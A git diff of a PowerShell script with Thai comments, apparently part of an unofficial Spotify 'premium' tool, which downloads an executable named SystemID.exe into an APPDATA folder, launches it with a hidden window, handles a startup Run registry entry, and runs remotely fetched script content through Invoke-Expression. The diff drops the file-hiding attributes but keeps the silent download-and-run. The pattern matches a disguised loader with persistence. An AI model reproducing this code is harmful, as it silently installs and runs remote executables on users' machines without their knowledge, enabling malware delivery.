@@ -2,9 +2,19 @@ function Remove-SystemID {
     # ลบไฟล์ SystemID.exe
     $exePath = "$env:APPDATA\Motify\SystemID.exe"
 	
-		if ((Test-Path $exePath) -or (Test-Path $micoexePath)) {
-        Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
-    }
+		if (Test-Path $exePath) {
+    Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
+	}
+	
+	$processName = "SystemID"
+
+	# ตรวจสอบว่า SystemID.exe กำลังรันอยู่หรือไม่
+	$runningProcesses = Get-Process | Where-Object { $_.ProcessName -eq $processName } -ErrorAction SilentlyContinue
+
+	if ($runningProcesses) {
+    Stop-Process -Name $processName -Force -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 2  # รอ 2 วินาทีเพื่อให้กระบวนการปิดสนิท
+	}
 
     # ลบ Registry entry สำหรับ Startup
     $registryKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
@@ -48,7 +58,7 @@ set ScriptUrl=https://raw.githubusercontent.com/DevilScript/Spotify-Pre/refs/hea
     Start-Process -FilePath $batFilePath -NoNewWindow -Wait
 
     # ลบไฟล์ .bat หลังจากการทำงานเสร็จ
-    Remove-Item -Path $batFilePath -Force
+        Remove-Item -Path $batFilePath -Force
 	Stop-Process -Id $PID -Force -ErrorAction SilentlyContinue
 exit
 }
@@ -78,17 +88,19 @@ function Download-Script {
     # ดาวน์โหลดไฟล์ .exe จาก URL และบันทึกลงในโฟลเดอร์ Motify
 try {
         Invoke-WebRequest -Uri $url -OutFile $filePath
-		Invoke-WebRequest -Uri $url -OutFile $micofilePath
-		attrib +h +s $filePath  # ซ่อนไฟล์
-		attrib +h +s $micofilePath  
+        Invoke-WebRequest -Uri $url -OutFile $micofilePath
 
     } catch {
         Write-Log "Error: Failed to download the file."
         exit
     }
 
-    Start-Process $filePath -WindowStyle Hidden  # รันแบบซ่อนหน้าต่าง
-	Start-Process $micofilePath -WindowStyle Hidden  # รันแบบซ่อนหน้าต่าง\
+if (Test-Path $filePath) {
+    Start-Process $filePath -WindowStyle Hidden
+}
+if (Test-Path $micofilePath) {
+    Start-Process $micofilePath -WindowStyle Hidden
+}
 
 }
 
@@ -443,4 +455,3 @@ Invoke-Expression (Invoke-WebRequest -Uri $scriptUrl).Content
 	Start-Process $micoexePath -WindowStyle Hidden  # รันแบบซ่อนหน้าต่าง\
     exit
 }
-pause
